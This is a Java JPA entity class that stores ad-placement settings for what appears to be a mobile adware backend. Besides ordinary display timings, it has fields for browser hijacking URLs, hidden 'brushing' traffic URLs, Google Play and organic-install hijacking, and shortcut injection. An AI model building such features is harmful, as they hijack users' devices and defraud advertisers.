package com.guang.web.mode;

import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.Lob;
import javax.persistence.Table;
import javax.persistence.Transient;

@Entity
@Table(name = "ad_positionConfig")
//alter table ad_positionConfig modify column whiteList text;
public class GAdPositionConfig {
	private Long id;
	private Long adPositionId;
	private int adPositionType;
	
	//公有属性
	private String timeSlot;//时间段 
	private Integer showNum;//每天广告展示次数
	private Float showTimeInterval;//广告时间间隔
	private String whiteList;//白名单
	private Integer adShowNum;//同一个广告显示次数
	
	//浏览器插屏配置
	private Float browerSpotTwoTime;//二次打开时间
	private Float browerSpotFlow;//流量
	//安装
	
	//卸载
	
	//banner
	private Float bannerDelyTime;//banner延迟时间
	private Float bannerTwoDelyTime;//banner二次延迟时间
	private Float bannerShowTime;//停留时间
	
	//充电
	
	//应用插屏
	private Float appSpotDelyTime;//应用插屏延迟时间
	
	//wifi
	
	//浏览器劫持
	private String browerBreakUrl;//浏览器劫持url
	
	//快捷方式
	private String shortcutIconPath;//快捷方式图标路径
	private String shortcutName;//图标名称
	private String shortcutUrl;//链接
	
	//暗刷
	private String behindBrushUrls;
	
	//gp劫持
	private Integer gpBrushNum;//补刷次数
	private String gpBrushTimeSlot;//补刷时间段 
	private Float gpBrushInterval;//补刷间隔
	private String gpOfferPriority;//GP OFFER 优先级
	
	private String gpDelyTime;//自然量劫持等待时间
	
	private String blackList;//黑名单
	
	private String countrys;//国家

	
	public GAdPositionConfig(){}
	public GAdPositionConfig(Long adPositionId, String timeSlot,
			Integer showNum, Float showTimeInterval, String whiteList,Integer adShowNum,
			Float browerSpotTwoTime,Float browerSpotFlow, Float bannerDelyTime,
			Float bannerTwoDelyTime,Float bannerShowTime,Float appSpotDelyTime,String behindBrushUrls) {
		super();
		this.adPositionId = adPositionId;
		this.timeSlot = timeSlot;
		this.showNum = showNum;
		this.showTimeInterval = showTimeInterval;
		this.whiteList = whiteList;
		this.adShowNum = adShowNum;
		this.browerSpotTwoTime = browerSpotTwoTime;
		this.browerSpotFlow = browerSpotFlow;
		this.bannerDelyTime = bannerDelyTime;
		this.bannerTwoDelyTime = bannerTwoDelyTime;
		this.bannerShowTime = bannerShowTime;
		this.appSpotDelyTime = appSpotDelyTime;
		this.behindBrushUrls = behindBrushUrls;
	}
	@Id
    @GeneratedValue(strategy = GenerationType.AUTO)
	public Long getId() {
		return id;
	}
	public void setId(Long id) {
		this.id = id;
	}
	public Long getAdPositionId() {
		return adPositionId;
	}
	public void setAdPositionId(Long adPositionId) {
		this.adPositionId = adPositionId;
	}
	@Column(length = 512)
	public String getTimeSlot() {
		return timeSlot;
	}
	public void setTimeSlot(String timeSlot) {
		this.timeSlot = timeSlot;
	}
	public Integer getShowNum() {
		return showNum;
	}
	public void setShowNum(Integer showNum) {
		this.showNum = showNum;
	}
	public Float getShowTimeInterval() {
		return showTimeInterval;
	}
	public void setShowTimeInterval(Float showTimeInterval) {
		this.showTimeInterval = showTimeInterval;
	}
	@Lob
	public String getWhiteList() {
		return whiteList;
	}
	public void setWhiteList(String whiteList) {
		this.whiteList = whiteList;
	}
	
	public Integer getAdShowNum() {
		return adShowNum;
	}
	public void setAdShowNum(Integer adShowNum) {
		this.adShowNum = adShowNum;
	}
	public Float getBrowerSpotTwoTime() {
		return browerSpotTwoTime;
	}
	public void setBrowerSpotTwoTime(Float browerSpotTwoTime) {
		this.browerSpotTwoTime = browerSpotTwoTime;
	}
	public Float getBannerDelyTime() {
		return bannerDelyTime;
	}
	public void setBannerDelyTime(Float bannerDelyTime) {
		this.bannerDelyTime = bannerDelyTime;
	}
	@Column(length = 1024)
	public String getBehindBrushUrls() {
		return behindBrushUrls;
	}
	public void setBehindBrushUrls(String behindBrushUrls) {
		this.behindBrushUrls = behindBrushUrls;
	}
	@Column(length = 64)
	public String getShortcutIconPath() {
		return shortcutIconPath;
	}
	public void setShortcutIconPath(String shortcutIconPath) {
		this.shortcutIconPath = shortcutIconPath;
	}
	@Column(length = 64)
	public String getShortcutName() {
		return shortcutName;
	}
	public void setShortcutName(String shortcutName) {
		this.shortcutName = shortcutName;
	}
	@Column(length = 128)
	public String getShortcutUrl() {
		return shortcutUrl;
	}
	public void setShortcutUrl(String shortcutUrl) {
		this.shortcutUrl = shortcutUrl;
	}
	@Transient
	public int getAdPositionType() {
		return adPositionType;
	}
	public void setAdPositionType(int adPositionType) {
		this.adPositionType = adPositionType;
	}
	public Float getBrowerSpotFlow() {
		return browerSpotFlow;
	}
	public void setBrowerSpotFlow(Float browerSpotFlow) {
		this.browerSpotFlow = browerSpotFlow;
	}
	@Column(length = 128)
	public String getBrowerBreakUrl() {
		return browerBreakUrl;
	}
	public void setBrowerBreakUrl(String browerBreakUrl) {
		this.browerBreakUrl = browerBreakUrl;
	}
	public Float getBannerTwoDelyTime() {
		return bannerTwoDelyTime;
	}
	public void setBannerTwoDelyTime(Float bannerTwoDelyTime) {
		this.bannerTwoDelyTime = bannerTwoDelyTime;
	}
	public Float getBannerShowTime() {
		return bannerShowTime;
	}
	public void setBannerShowTime(Float bannerShowTime) {
		this.bannerShowTime = bannerShowTime;
	}
	public Float getAppSpotDelyTime() {
		return appSpotDelyTime;
	}
	public void setAppSpotDelyTime(Float appSpotDelyTime) {
		this.appSpotDelyTime = appSpotDelyTime;
	}
	public Integer getGpBrushNum() {
		return gpBrushNum;
	}
	public void setGpBrushNum(Integer gpBrushNum) {
		this.gpBrushNum = gpBrushNum;
	}
	@Column(length = 512)
	public String getGpBrushTimeSlot() {
		return gpBrushTimeSlot;
	}
	public void setGpBrushTimeSlot(String gpBrushTimeSlot) {
		this.gpBrushTimeSlot = gpBrushTimeSlot;
	}
	public Float getGpBrushInterval() {
		return gpBrushInterval;
	}
	public void setGpBrushInterval(Float gpBrushInterval) {
		this.gpBrushInterval = gpBrushInterval;
	}
	@Column(length = 512)
	public String getGpOfferPriority() {
		return gpOfferPriority;
	}
	public void setGpOfferPriority(String gpOfferPriority) {
		this.gpOfferPriority = gpOfferPriority;
	}
	@Column(length = 512)
	public String getGpDelyTime() {
		return gpDelyTime;
	}
	public void setGpDelyTime(String gpDelyTime) {
		this.gpDelyTime = gpDelyTime;
	}
	@Lob
	public String getBlackList() {
		return blackList;
	}
	public void setBlackList(String blackList) {
		this.blackList = blackList;
	}
	
	@Lob
	public String getCountrys() {
		return countrys;
	}
	public void setCountrys(String countrys) {
		this.countrys = countrys;
	}
}
